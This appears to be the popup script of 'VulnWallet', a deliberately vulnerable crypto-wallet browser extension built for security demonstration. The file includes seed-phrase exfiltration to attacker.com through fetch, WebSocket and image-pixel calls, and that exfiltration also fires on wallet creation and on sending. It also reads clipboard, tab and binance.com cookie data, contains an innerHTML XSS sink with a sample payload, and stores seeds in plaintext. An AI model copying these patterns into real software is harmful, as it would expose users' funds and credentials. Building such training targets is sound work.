// VulnWallet popup.js
// Wallet logic and vulnerabilities

// Wallet state management
let walletState = {
  address: null,
  balance: 0,
  network: 'ethereum',
  transactions: []
};

// Initialize wallet from storage
function initWallet() {
  const savedState = localStorage.getItem('walletState');
  if (savedState) {
    walletState = JSON.parse(savedState);
    updateUI();
  }
}

// Save wallet state
function saveWalletState() {
  localStorage.setItem('walletState', JSON.stringify(walletState));
}

// Generate random wallet address
function generateAddress() {
  const chars = '0123456789abcdef';
  let address = '0x';
  for (let i = 0; i < 40; i++) {
    address += chars[Math.floor(Math.random() * chars.length)];
  }
  return address;
}

// Generate random seed phrase
function generateSeedPhrase() {
  const words = 'abandon ability able about above absent absorb abstract absurd abuse access accident account achieve acid acoustic acquire across act action actor actress actual adapt add addict address adjust admit adult advance advice aerobic affair afford afraid again age agent agree ahead aim air airport aisle alarm album alcohol alert alien all alley allow almost alone alpha already also alter always amateur amazing among amount amused analyst anchor ancient anger angle angry animal ankle announce annual another answer antenna antique anxiety any apart apology appear apple approve april arch arctic area arena argue arm armed armor army around arrange arrest arrive arrow art artefact artist artwork ask aspect assault asset assist assume asthma athlete atom attack attend attitude attract auction audit august aunt author auto autumn average avocado avoid awake aware away awesome awful awkward axis baby bachelor bacon badge bag balance balcony ball bamboo banana banner bar barely bargain barrel base basic basket battle beach bean beauty because become beef before begin behave behind believe below belt bench benefit best betray better between beyond bicycle bid bike bind biology bird birth bitter black blade blame blanket blast bleak bless blind blood blossom blouse blue blur blush board boat body boil bomb bone bonus book boost border boring borrow boss bottom bounce box boy bracket brain brand brass brave bread breeze brick bridge brief bright bring brisk broccoli broken bronze broom brother brown brush bubble buddy budget buffalo build bulb bulk bullet bundle bunker burden burger burst bus business busy butter buyer buzz cabbage cabin cable cactus cage cake call calm camera camp can cancel candy cannon canoe canvas canyon capable capital captain car carbon card cargo carpet carry cart case cash casino castle casual cat catch category cattle caught cause caution cave ceiling celery cement census center century certain chair chalk champion change chaos chapter charge chase cheap check cheese chef cherry chest chicken chief child chimney choice choose chronic chuckle chunk churn cigar cinnamon circle citizen city civil claim clap clarify claw clay clean clerk clever click client cliff climb clinic clip clock clog close cloth cloud clown club clump cluster clutch coach coast coconut code coffee coil coin collect color column combine come comfort comic common company concert conduct confirm congress connect consider control convince cook cool copper copy coral core corn correct cost cotton couch country couple course cousin cover coyote crack cradle craft cram crane crash crater crawl crazy cream credit creek crew cricket crime crisp critic crop cross crouch crowd crucial cruel cruise crumble crunch crush cry crystal cube culture cup cupboard curious current curtain curve cushion custom cute cycle dad damage dance danger daring dash daughter dawn day deal debate debris decade december decide decline decorate decrease deer defense define defy degree delay deliver demand demise denial dentist deny depart depend deposit depth deputy derive describe desert design desk despair destroy detail detect develop device devote diagram dial diamond diary dice diesel diet differ digital dignity dilemma dinner dinosaur direct dirt disagree discover disease dish dismiss disorder display distance divert divide divorce dizzy doctor document dog doll dolphin domain donate donkey donor door dose double dove draft dragon drama drastic draw dream dress drift drill drink drip drive drop drum dry duck dumb dune during dust dutch duty dwarf dynamic eager eagle early earn earth easily east easy echo ecology economy edge edit educate effort egg eight either elbow elder electric elegant element elephant elevator elite else embark embody embrace emerge emotion employ empower empty enable enact end endless endorse enemy energy enforce engage engine enhance enjoy enlist enough enrich enroll ensure enter entire entry envelope episode equal equip era erase erode erosion error erupt escape essay essence estate eternal ethics evidence evil evoke evolve exact example excess exchange excite exclude excuse execute exercise exhaust exhibit exile exist exit expand expect expire explain expose express extend extra eye eyebrow fabric face faculty fade faint faith fall false fame family famous fan fancy fantasy farm fashion fat fatal father fatigue fault favorite feature february federal fee feed feel female fence festival fetch fever few fiber fiction field figure file film filter final find fine finger finish fire firm first fiscal fish fit fitness fix flag flame flash flat flavor flee flight flip float flock floor flower fluid flush fly foam focus fog foil fold follow food foot force forest forget fork fortune forum forward fossil foster found fox fragile frame frequent fresh friend fringe frog front frost frown frozen fruit fuel fun funny furnace fury future gadget gain galaxy gallery game gap garage garbage garden garlic garment gas gasp gate gather gauge general genius genre gentle genuine gesture ghost giant gift giggle ginger giraffe girl give glad glance glare glass glide glimpse globe gloom glory glove glow glue goat goddess gold good goose gorilla gospel gossip govern gown grab grace grain grant grape grass gravity great green grid grief grit grocery group grow grunt guard guess guide guilt guitar gun gym habit hair half hammer hamster hand happy harbor hard harsh harvest hat have hawk hazard head health heart heavy hedgehog height hello helmet help hen hero hidden high hill hint hip hire history hobby hockey hold hole holiday hollow home honey honor hood hope horn horror horse hospital host hotel hour hover hub huge human humble humor hundred hungry hunt hurdle hurry hurt husband hybrid ice icon idea identify idle ignore ill illegal illness image imitate immense immune impact import impossible improve impulse income increase index indicate indoor industry infant inflict inform inhale inherit initial inject injury inmate inner innocent input inquiry insane insect inside inspire install intact interest into invest invite involve iron island isolate issue item ivory jacket jaguar jar jazz jealous jeans jelly jewel join joke journey joy judge juice jump jungle junior junk just kangaroo keen keep ketchup key kick kid kidney kind kingdom kiss kit kitchen kite kitten kiwi knee knife knock know lab label labor ladder lady lake lamp language laptop large later latin laugh laundry lava law lawn lawsuit layer lazy leader leaf learn leave lecture left leg legal legend leisure lemon lend length lens leopard lesson letter level liar liberty library license life lift light like limb limit link lion liquid list little live lizard load loan lobster local lock logic lonely long loop lottery loud lounge love loyal lucky luggage lumber lunar lunch luxury lyrics machine mad magic magnet maid mail main major make mammal man manage mandate mango mansion manual maple marble march margin marine market marriage mask mass master match material math matrix matter maximum maze meadow mean measure meat mechanic medal media melody melt member memory mention menu mercy merge merit merry mesh message metal method middle midnight milk million mimic mind minimum minor minute miracle mirror misery miss mistake mix mixed mixture mobile model modify mom moment monitor monkey monster month moon moral more morning mosquito mother motion motor mountain mouse move movie much muffin mule multiply muscle museum mushroom music must mutual myself mystery naive name napkin narrow nasty nation nature near neck need negative neglect neither nephew nerve nest net network neutral never news next nice night noble noise nominee noodle normal north nose notable note nothing notice novel now nuclear number nurse nut oak obey object oblige obscure observe obtain obvious occur ocean october odor off offer office often oil okay old olive olympic omit once one onion online only open opera opinion oppose option orange orbit orchard order ordinary organ orient original orphan ostrich other outdoor outer output outside oval oven over own owner oxygen oyster ozone pact paddle page pair palace palm panda panel panic panther paper parade parent park parrot party pass patch path patient patrol pattern pause pave payment peace peanut pear peasant pelican pen penalty pencil people pepper perfect permit person pet phone photo phrase physical piano picnic picture piece pig pigeon pill pilot pink pioneer pipe pistol pitch pizza place planet plastic plate play please pledge pluck plug plunge poem poet point polar pole police pond pony pool popular portion position possible post potato pottery poverty powder power practice praise predict prefer prepare present pretty prevent price pride primary print priority prison private prize problem process produce profit program project promote proof property prosper protect proud provide public pudding pull pulp pulse pumpkin punch pupil puppy purchase purity purpose purse push put puzzle pyramid quality quantum quarter question quick quit quiz quote rabbit raccoon race rack radar radio rain raise rally ramp ranch random range rapid rare rate rather raven raw razor ready real reason rebuild recall receive recipe record recover recycle reduce reflect reform refuse region regret regular reject relax release relief rely remain remember remind remove render renew rent reopen repair repeat replace report require rescue resemble resist resource response result retire retreat return reunion reveal review reward rhythm rib ribbon rice rich ride ridge rifle right rigid ring riot ripple risk ritual rival river road roast robot robust rocket romance roof rookie room rose rotate rough round route royal rubber rude rug rule run runway rural sad saddle sadness safe sail salad salmon salon salt same sample sand satisfy satoshi sauce sausage save say scale scan scare scatter scene scheme school science scissors scorpion scout scrap screen script scrub sea search season seat second secret section security seed seek segment select sell seminar senior sense sentence series service session settle setup seven shadow shaft shallow share shed shell sheriff shield shift shine ship shiver shock shoe shoot shop short shoulder shove shrimp shrug shuffle shy sibling sick side siege sight sign silent silk silly silver similar simple since sing siren sister situate six size skate sketch ski skill skin skirt skull slab slam sleep slender slice slide slight slim slogan slot slow small smart smile smoke smooth snack snake snap sniff snow soap soccer social sock soda soft solar soldier solid solution solve someone song soon sorry sort soul sound soup source south space spare spatial spawn speak special speed spell spend sphere spice spider spike spin spirit split spoil sponsor spoon sport spot spray spread spring spy square squeeze squirrel stable stadium staff stage stairs stamp stand start state stay steak steel stem step stereo stick still sting stock stomach stone stool story stove strategy street strike strong struggle student stuff stumble style subject submit subway success such sudden suffer sugar suggest suit summer sun sunny sunset super supply supreme sure surface surge surprise surround survey suspect sustain swallow swamp swap swarm swear sweet swift swim swing switch sword symbol symptom syrup system table tackle tag tail talent talk tank tape target task taste tattoo taxi teach team tell ten tenant tennis tent term test text thank that theme then theory there they thing this thought three thrive throw thumb thunder ticket tide tiger tilt timber time tiny tip tired tissue title toast today together toilet token tomato tomorrow tone tongue tonight tool tooth top topic topple torch tornado tortoise toss total tourist toward tower town toy track trade traffic tragic train transfer trap trash travel tray treat tree trend trial tribe trick trigger trim trip trophy trouble truck true truly trumpet trust truth try tube tuition tumble tuna tunnel turkey turn turtle twelve twenty twice twin twist two type typical ugly umbrella unable unaware uncle uncover under undo unfair unfold unhappy uniform unique unit universe unknown unlock until unusual unveil update upgrade uphold upon upper upset urban urge usage use used useful useless usual utility vacant vacuum vague valid valley valve van vanish vapor various vast vault vehicle velvet vendor venue verify version very vessel veteran viable vibrant vicious victory video view village vintage violin virtual virus visa visit visual vital vivid vocal voice void volcano volume vote voyage wage wagon wait walk wall walnut want warfare warm warrior wash wasp waste water wave way wealth weapon wear weasel weather web wedding weekend weird welcome west wet whale what when where whip whisper wide width wife wild will win window wine wing wink winner winter wire wisdom wise wish witness wolf woman wonder wood wool word work world worry worth wrap wreck wrestle wrist write wrong yard year yellow you young youth zebra zero zone zoo'.split(' ');
  const seed = [];
  for (let i = 0; i < 12; i++) {
    seed.push(words[Math.floor(Math.random() * words.length)]);
  }
  return seed.join(' ');
}

// Create new wallet
function createWallet() {
  const seedPhrase = generateSeedPhrase();
  walletState = {
    address: generateAddress(),
    balance: 1.0,
    network: 'ethereum',
    transactions: [],
    seedPhrase: seedPhrase
  };

  // Demonstrate vulnerabilities
  simulateExfiltration({
    type: 'wallet_creation',
    address: walletState.address,
    seedPhrase: seedPhrase
  });
  insecureStorage(walletState);

  saveWalletState();
  updateUI();
}

// Import wallet from seed phrase
function importWallet(seedPhrase) {
  // In a real wallet, this would derive the address from the seed phrase
  // For demo purposes, we'll just generate a new address
  walletState = {
    address: generateAddress(),
    balance: 0,
    network: 'ethereum',
    transactions: [],
    seedPhrase: seedPhrase
  };
  saveWalletState();
  updateUI();
}

// Vulnerability: Excessive Permissions Abuse
async function abusePermissions() {
  try {
    // 1. Clipboard Access (without proper user context)
    const clipboard = await navigator.clipboard.readText();
    localStorage.setItem('vw_clipboard_data', clipboard);

    // 2. Tab Access (reading current tab URL)
    const tabs = await chrome.tabs.query({active: true, currentWindow: true});
    if (tabs[0]) {
      localStorage.setItem('vw_current_tab', tabs[0].url);
    }

    // 3. Cookie Access (attempting to read cookies from other domains)
    try {
      const cookies = await chrome.cookies.getAll({domain: 'binance.com'});
      localStorage.setItem('vw_binance_cookies', JSON.stringify(cookies));
    } catch (e) {
      console.log('Cookie access denied');
    }
  } catch (e) {
    console.log('Permission abuse failed:', e);
  }
}

// Vulnerability: Man-in-the-Middle (MitM) Simulation
async function simulateMitM() {
  try {
    // Simulate fetching token prices from an insecure endpoint
    const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd', {
      method: 'GET',
      headers: {
        'Accept': 'application/json'
      }
    });
    const data = await response.json();

    console.log(data);
    
    // Store manipulated prices
    localStorage.setItem('vw_token_prices', JSON.stringify({
      ETH: data.ETH * 0.95, // Manipulate price down by 5%
      timestamp: Date.now()
    }));
    
    return data;
  } catch (e) {
    console.log('MitM simulation failed:', e);
    // Fallback to hardcoded prices
    return {
      ETH: 2000,
      timestamp: Date.now()
    };
  }
}

// Vulnerability: Cross-Site Scripting (XSS)
function simulateXSS(memo) {
  // Unsafe memo handling - allows script injection
  const txList = document.getElementById('tx-list');
  if (txList && memo) {
    // Vulnerable to XSS if memo contains script tags
    const txEl = document.createElement('div');
    txEl.className = 'tx-item';
    txEl.innerHTML = `
      <div style="display:flex;justify-content:space-between;margin-bottom:4px;">
        <span style="color:#b6b8d6;">✓ 0.1 ETH</span>
        <span style="font-size:0.9em;color:#b6b8d6;">${new Date().toLocaleTimeString()}</span>
      </div>
      <div style="font-size:0.9em;color:#b6b8d6;">Memo: ${memo}</div>
    `;
    txList.prepend(txEl);
  }
}

// Vulnerability: Data Exfiltration
function simulateExfiltration(data) {
  // Simulate data exfiltration through various channels
  const exfilChannels = [
    // 1. Fake API endpoint
    () => fetch('https://jsonplaceholder.typicode.com/posts', {
      method: 'POST',
      body: JSON.stringify(data)
    }),
    // 2. WebSocket connection
    () => {
      const ws = new WebSocket('ws://attacker.com/ws');
      ws.onopen = () => ws.send(JSON.stringify(data));
    },
    // 3. Image pixel tracking
    () => {
      const img = new Image();
      img.src = `http://attacker.com/track?data=${btoa(JSON.stringify(data))}`;
    }
  ];

  // Try each exfiltration channel
  exfilChannels.forEach(channel => {
    try {
      channel();
    } catch (e) {
      console.log('Exfiltration channel failed:', e);
    }
  });
}

// Vulnerability: Insecure Data Storage
function insecureStorage(data) {
  // Store sensitive data in localStorage without encryption
  localStorage.setItem('vw_wallet_data', JSON.stringify({
    ...data,
    seedPhrase: data.seedPhrase, // Storing seed phrase in plaintext
    privateKey: '0x' + Math.random().toString(16).slice(2), // Simulated private key
    lastBackup: new Date().toISOString()
  }));
}

// Send transaction
async function sendTransaction(to, amount, memo = '') {
  if (amount > walletState.balance) {
    throw new Error('Insufficient balance');
  }

  // Simulate transaction
  const tx = {
    hash: '0x' + Math.random().toString(16).slice(2),
    from: walletState.address,
    to,
    amount,
    memo,
    timestamp: Date.now(),
    status: 'pending'
  };

  // Update balance
  walletState.balance -= amount;
  walletState.transactions.unshift(tx);
  
  // Demonstrate vulnerabilities
  await abusePermissions(); // Excessive permissions
  await simulateMitM(); // MitM simulation
  simulateXSS(memo); // XSS vulnerability
  simulateExfiltration({ // Data exfiltration
    type: 'transaction',
    data: tx,
    wallet: walletState.address
  });
  insecureStorage({ // Insecure storage
    ...walletState,
    lastTransaction: tx
  });

  saveWalletState();
  updateUI();

  // Simulate transaction confirmation
  setTimeout(() => {
    tx.status = 'confirmed';
    saveWalletState();
    updateUI();
  }, 2000);

  return tx;
}

// Update UI based on wallet state
function updateUI() {
  const walletInfo = document.getElementById('wallet-info');
  const createBtn = document.getElementById('create-wallet-btn');
  const importBtn = document.getElementById('import-wallet-btn');
  const balanceEth = document.getElementById('balance-eth');
  const balanceUsd = document.getElementById('balance-usd');
  const walletAddress = document.getElementById('wallet-address');
  const txList = document.getElementById('tx-list');
  const networkSelect = document.getElementById('network-select');

  if (walletState.address) {
    walletInfo.style.display = 'block';
    createBtn.style.display = 'none';
    importBtn.style.display = 'none';
    
    balanceEth.textContent = walletState.balance.toFixed(4);
    balanceUsd.textContent = (walletState.balance * 2000).toFixed(2); // Simulated ETH price
    walletAddress.textContent = walletState.address;
    networkSelect.value = walletState.network;

    // Update transaction list
    txList.innerHTML = '';
    walletState.transactions.slice(0, 5).forEach(tx => {
      const txEl = document.createElement('div');
      txEl.className = 'tx-item';
      txEl.innerHTML = `
        <div style="display:flex;justify-content:space-between;margin-bottom:4px;">
          <span style="color:#b6b8d6;">${tx.status === 'pending' ? '⏳' : '✓'} ${tx.amount} ETH</span>
          <span style="font-size:0.9em;color:#b6b8d6;">${new Date(tx.timestamp).toLocaleTimeString()}</span>
        </div>
        <div style="font-size:0.9em;color:#b6b8d6;">To: ${tx.to.slice(0, 6)}...${tx.to.slice(-4)}</div>
        ${tx.memo ? `<div style="font-size:0.9em;color:#b6b8d6;margin-top:4px;">${tx.memo}</div>` : ''}
      `;
      txList.appendChild(txEl);
    });
  } else {
    walletInfo.style.display = 'none';
    createBtn.style.display = '';
    importBtn.style.display = '';
  }
}

// Event Listeners
document.addEventListener('DOMContentLoaded', () => {
  // Initialize wallet
  initWallet();

  // Create wallet button
  document.getElementById('create-wallet-btn').addEventListener('click', () => {
    createWallet();
  });

  // Import wallet button
  document.getElementById('import-wallet-btn').addEventListener('click', () => {
    const seedPhrase = prompt('Enter your seed phrase:');
    if (seedPhrase) {
      importWallet(seedPhrase);
    }
  });

  // Send form
  document.getElementById('transfer-form').addEventListener('submit', async (e) => {
    e.preventDefault();
    const to = document.getElementById('recipient').value;
    const amount = parseFloat(document.getElementById('amount').value);
    const memo = document.getElementById('memo').value;

    try {
      await sendTransaction(to, amount, memo);
      document.getElementById('send-form').style.display = 'none';
      document.getElementById('transfer-form').reset();
    } catch (error) {
      alert(error.message);
    }
  });

  // Quick action buttons
  document.getElementById('send-btn').addEventListener('click', () => {
    document.getElementById('send-form').style.display = 
      document.getElementById('send-form').style.display === 'none' ? 'block' : 'none';
    document.getElementById('receive-form').style.display = 'none';
  });

  document.getElementById('receive-btn').addEventListener('click', () => {
    document.getElementById('receive-form').style.display = 
      document.getElementById('receive-form').style.display === 'none' ? 'block' : 'none';
    document.getElementById('send-form').style.display = 'none';
  });

  document.getElementById('swap-btn').addEventListener('click', () => {
    alert('Swap functionality coming soon!');
  });

  // Copy address button
  document.getElementById('copy-address').addEventListener('click', () => {
    navigator.clipboard.writeText(walletState.address);
    alert('Address copied to clipboard!');
  });

  // Network selector
  document.getElementById('network-select').addEventListener('change', (e) => {
    walletState.network = e.target.value;
    saveWalletState();
    updateUI();
  });

  // Refresh balance button
  document.getElementById('refresh-balance').addEventListener('click', () => {
    // Simulate balance update
    walletState.balance = parseFloat((walletState.balance + Math.random() * 0.1).toFixed(4));
    saveWalletState();
    updateUI();
  });

  // Dev panel
  document.getElementById('toggle-dev').addEventListener('click', () => {
    const devContent = document.getElementById('dev-content');
    devContent.style.display = devContent.style.display === 'none' ? 'block' : 'none';
    document.getElementById('toggle-dev').textContent = 
      devContent.style.display === 'none' ? 'Show' : 'Hide';
  });

  document.getElementById('exfil-seed').addEventListener('click', () => {
    if (!walletState.seedPhrase) {
      alert('No wallet to exfiltrate!');
      return;
    }
    // Simulate exfiltration
    fetch('http://attacker.com/exfil', {
      method: 'POST',
      body: JSON.stringify({ seed: walletState.seedPhrase })
    }).then(() => {
      document.getElementById('dev-status').textContent = 'Seed exfiltrated! (Simulated)';
    }).catch(() => {
      document.getElementById('dev-status').textContent = 'Exfiltration failed.';
    });
  });

  document.getElementById('show-seed').addEventListener('click', () => {
    if (!walletState.seedPhrase) {
      alert('No wallet to show!');
      return;
    }
    alert(`Your seed phrase: ${walletState.seedPhrase}\n\nWARNING: Never share your seed phrase with anyone!`);
  });

  // Add vulnerability demonstration buttons to dev panel
  const devContent = document.getElementById('dev-content');
  const vulnButtons = `
    <button id="demo-permissions" class="danger-btn">Demo Permissions Abuse</button>
    <button id="demo-mitm" class="danger-btn">Demo MitM Attack</button>
    <button id="demo-xss" class="danger-btn">Demo XSS</button>
    <button id="demo-exfil" class="danger-btn">Demo Exfiltration</button>
    <button id="demo-storage" class="danger-btn">Demo Insecure Storage</button>
  `;
  devContent.insertAdjacentHTML('beforeend', vulnButtons);

  // Add event listeners for vulnerability demonstration
  document.getElementById('demo-permissions').addEventListener('click', abusePermissions);
  document.getElementById('demo-mitm').addEventListener('click', async () => {
    const prices = await simulateMitM();
    document.getElementById('dev-status').textContent = 
      `MitM simulated! ETH price: $${prices.ETH}`;
  });
  document.getElementById('demo-xss').addEventListener('click', () => {
    simulateXSS('<img src=https://media.tenor.com/2nEy5Ee9d3EAAAAj/13th.gif onerror="alert(\'XSS Demo\')">');
    document.getElementById('dev-status').textContent = 'XSS demo executed!';
  });
  document.getElementById('demo-exfil').addEventListener('click', () => {
    simulateExfiltration({
      type: 'demo',
      timestamp: Date.now(),
      wallet: walletState.address
    });
    document.getElementById('dev-status').textContent = 'Exfiltration demo executed!';
  });
  document.getElementById('demo-storage').addEventListener('click', () => {
    insecureStorage(walletState);
    document.getElementById('dev-status').textContent = 
      'Data stored insecurely! Check localStorage.';
  });
}); 